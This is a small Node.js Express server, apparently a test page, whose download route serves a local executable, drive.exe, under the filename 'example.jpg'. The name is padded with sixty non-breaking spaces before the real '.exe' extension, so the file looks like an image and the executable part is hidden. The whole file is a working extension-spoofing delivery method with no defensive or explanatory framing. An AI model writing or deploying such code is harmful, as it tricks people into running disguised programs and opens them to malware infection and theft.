const express = require("express");
const path = require("path");

const app = express();
const PORT = 3000;

// Route halaman utama
app.get("/", (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="id">
    <head>
      <meta charset="UTF-8">
      <title>Download Test</title>
    </head>
    <body>
      <button onclick="downloadFile()">Download</button>

      <script>
        function downloadFile() {
          window.location.href = "/download";
        }
      </script>
    </body>
    </html>
  `);
});

// Route download
app.get("/download", (req, res) => {
  const filePath = path.join(__dirname, "files", "drive.exe");

  const nbsp = "\u00A0".repeat(60);

  res.setHeader(
    "Content-Disposition",
    `attachment; filename="example.jpg${nbsp}.exe"`
  );

  res.setHeader("Content-Type", "application/octet-stream");

  res.sendFile(filePath);
});

app.listen(PORT, () => {
  console.log("Server running at http://localhost:" + PORT);
});
